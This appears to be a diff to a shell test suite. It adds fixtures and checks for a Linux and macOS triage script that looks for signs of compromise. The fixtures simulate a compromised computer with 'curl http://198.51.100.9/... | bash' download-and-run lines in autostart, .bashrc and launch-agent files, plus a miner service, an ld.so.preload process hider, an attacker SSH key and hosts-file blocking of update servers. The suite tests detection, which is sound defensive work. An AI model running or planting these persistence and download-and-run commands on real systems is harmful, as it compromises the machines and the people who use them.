@@ -59,7 +59,7 @@ new_env() {
     stub "$BIN" id 'case "$1" in -u) echo 1000 ;; -un) echo alice ;; -Gn) awk -F: -v u="${2:-alice}" '"'"'BEGIN { printf "%s", u } { n = split($4, m, ","); for (i = 1; i <= n; i++) if (m[i] == u) printf " %s", $1 } END { print "" }'"'"' "'"$FAKE"'/etc/group" 2>/dev/null ;; *) echo "uid=1000(alice)" ;; esac'
     # GNU forms used by -linux.sh scripts, mapped onto whatever date/stat this computer has.
     stub "$BIN" date "case \"\$1\" in -d) v=\$2; shift 2; if $REAL_DATE -d @0 >/dev/null 2>&1; then exec $REAL_DATE -d \"\$v\" \"\$@\"; fi; case \"\$v\" in @*) e=\${v#@} ;; *) e=\$($REAL_DATE -j -f '%Y-%m-%d %H:%M:%S' \"\$v\" +%s 2>/dev/null || $REAL_DATE -j -f '%Y-%m-%d' \"\$v\" +%s 2>/dev/null || $REAL_DATE -j -f '%a %b %d %H:%M:%S %Y' \"\$v\" +%s 2>/dev/null) ;; esac; [ -n \"\$e\" ] || exit 1; exec $REAL_DATE -r \$e \"\$@\" ;; *) exec $REAL_DATE \"\$@\" ;; esac"
-    stub "$BIN" stat "if [ \"\$1\" = -c ]; then shift 2; if $REAL_STAT -c %Y / >/dev/null 2>&1; then exec $REAL_STAT -c %Y \"\$@\"; else exec $REAL_STAT -f %m \"\$@\"; fi; else exec $REAL_STAT \"\$@\"; fi"
+    stub "$BIN" stat "if [ \"\$1\" = -c ]; then f=\$2; shift 2; if $REAL_STAT -c %Y / >/dev/null 2>&1; then exec $REAL_STAT -c \"\$f\" \"\$@\"; elif [ \"\$f\" = %U ]; then exec $REAL_STAT -f %Su \"\$@\"; else exec $REAL_STAT -f %m \"\$@\"; fi; else exec $REAL_STAT \"\$@\"; fi"
     # Anything that would send traffic fails loudly and leaves a marker.
     for c in ping nc curl wget dig nslookup host avahi-resolve; do
         stub "$BIN" "$c" "echo \"NETWORK STUB CALLED: $c \$*\" >>\"$WORK/$1/network-calls\"; exit 1"
@@ -943,6 +943,118 @@ check 'B4 mac: mDNSResponder sent HUP, not restarted' "$CALLS" 'killall -HUP mDN
 check 'B4 mac: running cupsd restarted' "$CALLS" 'launchctl kickstart -k system/org\.cups\.cupsd'
 check_not 'B4 mac: mDNSResponder never kickstarted' "$CALLS" 'kickstart.*mDNSResponder'
 check 'B4 mac: cache result' "$OUT" '\[PASS\] +mDNSResponder: clear cache - DNS cache cleared\.'
+
+# =========================================================================================
+# C3 get-suspicious-activity-report-linux.sh / -macos.sh
+# =========================================================================================
+C3L=security-operations/diagnostics/endpoint-posture/get-suspicious-activity-report-linux.sh
+C3M=security-operations/diagnostics/endpoint-posture/get-suspicious-activity-report-macos.sh
+old_file() { touch -t 202001010000 "$@"; }
+
+# --- Linux: a compromised-looking computer --------------------------------------------------
+new_env c3-linux
+mkdir -p "$FAKE/etc/systemd/system" "$FAKE/etc/xdg/autostart" "$FAKE/etc/cron.d" "$FAKE/home/alice/.config/autostart" "$FAKE/home/alice/.ssh" \
+    "$FAKE/proc/1234" "$FAKE/proc/2000" "$FAKE/proc/3000" "$FAKE/proc/4000" "$FAKE/proc/5000"
+printf '[Service]\nExecStart=/tmp/.x/kworker -o pool.example:3333\n' >"$FAKE/etc/systemd/system/kworkerd.service"
+printf '[Service]\nExecStart=/usr/sbin/nginx -g "daemon on;"\n' >"$FAKE/etc/systemd/system/nginx.service"
+old_file "$FAKE/etc/systemd/system/nginx.service"
+printf '[Desktop Entry]\nExec=sh -c "curl -s http://198.51.100.9/x | bash"\n' >"$FAKE/home/alice/.config/autostart/update-helper.desktop"
+printf '[Desktop Entry]\nExec=/usr/bin/system-config-printer-applet\n' >"$FAKE/etc/xdg/autostart/print-applet.desktop"
+printf '0 3 * * * root /usr/local/bin/backup.sh\n' >"$FAKE/etc/cron.d/backup"
+old_file "$FAKE/etc/cron.d/backup"
+stub "$BIN" crontab 'printf "# m h dom mon dow command\n*/5 * * * * /home/alice/.cache/.sys/update >/dev/null 2>&1\n"'
+printf '/lib/x86_64-linux-gnu/libprocesshider.so\n' >"$FAKE/etc/ld.so.preload"
+printf 'PATH="/usr/bin"\nhttp_proxy=http://198.51.100.66:3128\n' >"$FAKE/etc/environment"
+printf 'alias ll="ls -l"\ncurl -fsSL http://198.51.100.9/i.sh | bash\n' >"$FAKE/home/alice/.bashrc"
+printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMock attacker@box\n' >"$FAKE/home/alice/.ssh/authorized_keys"
+printf '127.0.0.1 localhost\n127.0.1.1 mockhost\n::1 ip6-localhost ip6-loopback\n0.0.0.0 security.ubuntu.com\n' >"$FAKE/etc/hosts"
+ln -s /tmp/.x/kworker "$FAKE/proc/1234/exe"
+ln -s '/memfd:payload (deleted)' "$FAKE/proc/2000/exe"
+ln -s '/usr/lib/firefox/firefox (deleted)' "$FAKE/proc/3000/exe"
+ln -s /usr/bin/bash "$FAKE/proc/4000/exe"
+stub "$BIN" ss 'printf "0 0 198.51.100.23:51000 203.0.113.5:3333 users:((\"kworker\",pid=1234,fd=5))\n0 0 198.51.100.23:51002 198.51.100.7:443 users:((\"bash\",pid=4000,fd=3))\n"'
+stub "$BIN" journalctl 'case "$*" in *"-n 1"*) exit 0 ;; *) i=0; while [ $i -lt 25 ]; do echo "Failed password for root from 203.0.113.8 port 4242 ssh2"; i=$((i + 1)); done ;; esac'
+OUT="$WORK/c3-linux.txt"
+run_script c3-linux "$C3L" "$OUT" --output "$WORK/c3-linux/export"
+check 'C3 linux: exit 0' "$OUT.rc" '^0$'
+check 'C3 linux: labelled as triage, not EDR' "$OUT" '\[INFO\] +Scope - .*not an antivirus or EDR'
+check 'C3 linux: unit in hidden /tmp folder' "$OUT" '\[WARN\] +Startup items in unusual folders - .*kworkerd\.service.*/tmp/\.x/kworker'
+check 'C3 linux: cron job in a hidden folder' "$OUT" 'Startup items in unusual folders - .*crontab "alice": /home/alice/\.cache/\.sys/update'
+check_not 'C3 linux: nginx not in unusual folders' "$OUT" 'Startup items in unusual folders - .*nginx'
+check 'C3 linux: curl piped to bash at autostart' "$OUT" '\[WARN\] +Startup items that run scripts - .*update-helper\.desktop.*curl -s'
+check 'C3 linux: new user autostart and unit' "$OUT" '\[WARN\] +New startup items - .*kworkerd\.service.*update-helper\.desktop'
+check_not 'C3 linux: package autostart and old cron.d not judged new' "$OUT" 'New startup items - .*(print-applet|backup\.sh|nginx)'
+check 'C3 linux: ld.so.preload' "$OUT" '\[WARN\] +Preloaded libraries - /etc/ld\.so\.preload: /lib/x86_64-linux-gnu/libprocesshider\.so'
+check 'C3 linux: .bashrc download line' "$OUT" '\[WARN\] +Login shell files - ~/\.bashrc: curl -fsSL'
+check 'C3 linux: /tmp process' "$OUT" '\[WARN\] +Programs running from unusual folders - .*/tmp/\.x/kworker \(PID 1234'
+check 'C3 linux: memfd process' "$OUT" 'Programs running from unusual folders - .*/memfd:payload \(PID 2000, .*memory only \(memfd\), file deleted'
+check 'C3 linux: unreadable process counted' "$OUT" 'Programs running from unusual folders - .*1 of 5 process\(es\) belong to other users'
+check 'C3 linux: updated firefox is INFO, not WARN' "$OUT" '\[INFO\] +Programs replaced while running - /usr/lib/firefox/firefox \(PID 3000\)'
+check 'C3 linux: connection of the flagged program only' "$OUT" '\[WARN\] +Connections from flagged programs - PID 1234 -> 203\.0\.113\.5:3333\.'
+check 'C3 linux: new SSH key' "$OUT" '\[WARN\] +SSH keys - Changed in the last 14 day\(s\): /home/alice/\.ssh/authorized_keys \(1 key'
+check 'C3 linux: failed SSH logins' "$OUT" '\[WARN\] +Failed sign-ins - 25 failed SSH sign-in\(s\) in the last 24 hours: root \(25\)'
+check 'C3 linux: hosts entry for Ubuntu security' "$OUT" '\[WARN\] +Hosts file - 1 entr\(ies\), including: 0\.0\.0\.0 security\.ubuntu\.com'
+check 'C3 linux: proxy in /etc/environment' "$OUT" '\[WARN\] +Proxy settings - .*http_proxy=http://198\.51\.100\.66:3128 \(/etc/environment\)'
+check_not 'C3 linux: no ERROR findings' "$OUT" '\[ERROR\]'
+json=$(find "$WORK/c3-linux/export" -name '*.json' 2>/dev/null | head -n 1)
+check_exists 'C3 linux: JSON exported' "$json"
+[ -n "$json" ] && check 'C3 linux: CheckId C3' "$json" '"CheckId": "C3"'
+[ -n "$json" ] && check 'C3 linux: same check ID as Windows' "$json" '"Id": "C3\.Startup\.Startup-items-in-unusual-folders"'
+
+# --- Linux: clean, journal not readable -----------------------------------------------------
+new_env c3-linux-clean
+mkdir -p "$FAKE/etc" "$FAKE/proc/4000"
+printf '127.0.0.1 localhost\n127.0.1.1 mockhost\n' >"$FAKE/etc/hosts"
+ln -s /usr/bin/bash "$FAKE/proc/4000/exe"
+stub "$BIN" ss 'exit 0'
+stub "$BIN" crontab 'echo "no crontab for alice" >&2; exit 1'
+stub "$BIN" journalctl 'echo "Hint: You are currently not seeing messages from other users and the system." >&2'
+OUT="$WORK/c3-linux-clean.txt"
+run_script c3-linux-clean "$C3L" "$OUT"
+check 'C3 linux clean: exit 0' "$OUT.rc" '^0$'
+for c in 'Startup items in unusual folders' 'Startup items that run scripts' 'New startup items' 'Preloaded libraries' 'Login shell files' \
+    'Programs running from unusual folders' 'Connections from flagged programs' 'SSH keys' 'Hosts file' 'Proxy settings'; do
+    check "C3 linux clean: $c PASS" "$OUT" "\\[PASS\\] +$c - "
+done
+check 'C3 linux clean: journal not readable = SKIPPED' "$OUT" '\[SKIPPED\] Failed sign-ins - Skipped: this account can only see its own journal'
+check_not 'C3 linux clean: no ERROR findings' "$OUT" '\[ERROR\]'
+
+# --- macOS: flagged items (the real run on the development Mac was clean) --------------------
+new_env c3-mac
+stub "$BIN" uname 'case "$1" in -s) echo Darwin ;; -n) echo mockmac ;; *) echo Darwin ;; esac'
+stub "$BIN" id 'case "$1" in -u) echo 501 ;; -un) echo alice ;; *) echo "uid=501(alice)" ;; esac'
+stub "$BIN" sw_vers 'echo 26.0'
+mkdir -p "$FAKE/Library/LaunchAgents" "$FAKE/Library/LaunchDaemons" "$FAKE/home/alice/Library/LaunchAgents" "$FAKE/etc"
+# Fake property lists: one "Key=value" line per key; ProgramArguments as a JSON array.
+printf 'Label=com.apple.sneaky\nProgramArguments=["/Users/Shared/.cache/agent","--quiet"]\n' >"$FAKE/Library/LaunchDaemons/com.apple.sneaky.plist"
+printf 'Label=com.search.helper\nProgramArguments=["/bin/sh","-c","curl -s http://198.51.100.9/p | sh"]\n' >"$FAKE/home/alice/Library/LaunchAgents/com.search.helper.plist"
+printf 'Label=com.example.unsigned\nProgram=/home/alice/Library/Application Support/Example/unsigned-helper\n' >"$FAKE/home/alice/Library/LaunchAgents/com.example.unsigned.plist"
+printf 'Label=com.example.updater\nProgramArguments=["/Applications/Example.app/Contents/MacOS/updater"]\n' >"$FAKE/Library/LaunchAgents/com.example.updater.plist"
+old_file "$FAKE/Library/LaunchAgents/com.example.updater.plist"
+mkdir -p "$FAKE/home/alice/Library/Application Support/Example" && : >"$FAKE/home/alice/Library/Application Support/Example/unsigned-helper"
+stub "$BIN" plutil 'key=$2; fmt=$3; f=$6; v=$(sed -n "s/^$key=//p" "$f"); [ -n "$v" ] || exit 1; printf "%s\n" "$v"'
+stub "$BIN" codesign 'for a in "$@"; do f=$a; done; case "$f" in *unsigned*) [ "$1" = -dv ] && echo "code object is not signed at all" >&2; exit 1 ;; esac; exit 0'
+stub "$BIN" crontab 'exit 1'
+stub "$BIN" ps 'printf "  321 alice /private/tmp/.u/miner\n  322 alice /Applications/Safari.app/Contents/MacOS/Safari\n  323 alice /private/var/folders/ab/cd/X/0000/d/Wrapper/Game.app/Game\n"'
+stub "$BIN" lsof 'printf "COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\nminer 321 alice 5u IPv4 0x1 0t0 TCP 198.51.100.23:51000->203.0.113.5:3333 (ESTABLISHED)\nSafari 322 alice 9u IPv4 0x2 0t0 TCP 198.51.100.23:51001->198.51.100.7:443 (ESTABLISHED)\n"'
+stub "$BIN" scutil 'printf "<dictionary> {\n  HTTPEnable : 1\n  HTTPPort : 8080\n  HTTPProxy : 127.0.0.1\n  ProxyAutoConfigEnable : 0\n}\n"'
+printf '127.0.0.1 localhost\n255.255.255.255 broadcasthost\n::1 localhost\n127.0.0.1 xprotect.apple.com\n' >"$FAKE/etc/hosts"
+OUT="$WORK/c3-mac.txt"
+run_script c3-mac "$C3M" "$OUT" --output "$WORK/c3-mac/export"
+check 'C3 mac: exit 0' "$OUT.rc" '^0$'
+check 'C3 mac: labelled as triage, not EDR' "$OUT" '\[INFO\] +Scope - .*not an antivirus or EDR'
+check 'C3 mac: daemon in a hidden /Users/Shared folder' "$OUT" '\[WARN\] +Startup items in unusual folders - /Library/LaunchDaemons "com\.apple\.sneaky"'
+check 'C3 mac: agent that pipes curl to sh' "$OUT" '\[WARN\] +Startup items that run scripts - .*com\.search\.helper.*curl -s'
+check 'C3 mac: unsigned helper in the home folder' "$OUT" '\[WARN\] +Unsigned startup programs - .*com\.example\.unsigned'
+check 'C3 mac: new items, old one left out' "$OUT" '\[WARN\] +New startup items - '
+check_not 'C3 mac: old updater not new' "$OUT" 'New startup items - .*com\.example\.updater'
+check 'C3 mac: Background items need sudo' "$OUT" '\[SKIPPED\] Background items - Skipped: requires root'
+check 'C3 mac: /tmp process' "$OUT" '\[WARN\] +Programs running from unusual folders - /private/tmp/\.u/miner \(PID 321, alice\)'
+check_not 'C3 mac: signed iPhone-app wrapper not flagged' "$OUT" 'Programs running from unusual folders - .*Wrapper'
+check 'C3 mac: its connection only' "$OUT" '\[WARN\] +Connections from flagged programs - PID 321 -> 203\.0\.113\.5:3333\.'
+check 'C3 mac: hosts entry for XProtect' "$OUT" '\[WARN\] +Hosts file - 1 entr\(ies\), including: 127\.0\.0\.1 xprotect\.apple\.com'
+check 'C3 mac: proxy' "$OUT" '\[WARN\] +Proxy settings - Web traffic goes through: web proxy 127\.0\.0\.1:8080\.'
+check_not 'C3 mac: no ERROR findings' "$OUT" '\[ERROR\]'
 
 # =========================================================================================
 # Bundle run-home-audit-bundle.sh
